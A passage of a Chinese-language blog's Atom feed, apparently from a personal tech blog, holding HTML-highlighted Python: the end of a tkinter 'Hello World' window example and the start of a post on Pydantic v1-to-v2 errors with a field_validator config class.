&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;tkinter&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ttk&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;root&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Tk&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;frm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ttk&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Frame&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;root&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;padding&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;10&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;frm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;grid&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ttk&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Label&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;frm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;text&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;Hello World!&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;grid&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;column&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;row&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ttk&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Button&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;frm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;text&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;Quit&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;command&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;root&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;destroy&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;grid&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;column&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;row&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;root&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;mainloop&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在所需要的代码里面加上这段即可。&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>Pydantic 错误集锦</title>
		<published>2025-01-26T00:00:00+00:00</published>
		<updated>2025-01-26T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/pydanticcuo-wu/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/pydanticcuo-wu/</id>
		<content type="html">&lt;h2 id=&quot;pydantic-mistakes-ji-jin&quot;&gt;Pydantic mistakes 集锦&lt;a class=&quot;zola-anchor&quot; href=&quot;#pydantic-mistakes-ji-jin&quot; aria-label=&quot;Anchor link for: pydantic-mistakes-ji-jin&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;missingcuo-wu&quot;&gt;Missing错误&lt;a class=&quot;zola-anchor&quot; href=&quot;#missingcuo-wu&quot; aria-label=&quot;Anchor link for: missingcuo-wu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;pydanic从1更新到2出现了一些毛病，这里对其进行说明。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;pydantic&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;BaseModel&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-import-list z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;field_validator&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-class z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-class z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-class z-python&quot;&gt;class&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-class z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Config&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-class z-inheritance z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-inheritance z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-class z-inheritance z-python&quot;&gt;&lt;span class=&quot;z-entity z-other z-inherited-class z-python&quot;&gt;BaseModel&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-inheritance z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-class z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-class z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;weather_api_key&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-annotation z-variable z-python&quot;&gt;:&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;str&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;111&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;weather_command_priority&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-annotation z-variable z-python&quot;&gt;:&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;10&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;weather_plugin_enabled&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-annotation z-variable z-python&quot;&gt;:&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;bool&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-language z-python&quot;&gt;True&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-annotation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-annotation z-python&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-annotation z-function z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-annotation z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-annotation z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;field_validator&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-annotation z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-annotation z-arguments z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;weather_command_priority&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-annotation z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-annotation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-annotation z-python&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-annotation z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;classmethod&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;    &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;check_priority&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;cls&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-parameters z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;v&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-annotation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-annotation z-parameter z-python&quot;&gt;:&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-annotation z-return z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-annotation z-return z-python&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-statement z-conditional z-if z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-conditional z-if z-python&quot;&gt;if&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;v&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-comparison z-python&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-block z-conditional z-if z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;            &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;v&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-statement z-raise z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-flow z-raise z-python&quot;&gt;raise&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-exception z-python&quot;&gt;ValueError&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;weather command priority must greater than 1&lt;span class=&quot;z-punctuation z-definition z-string z-end 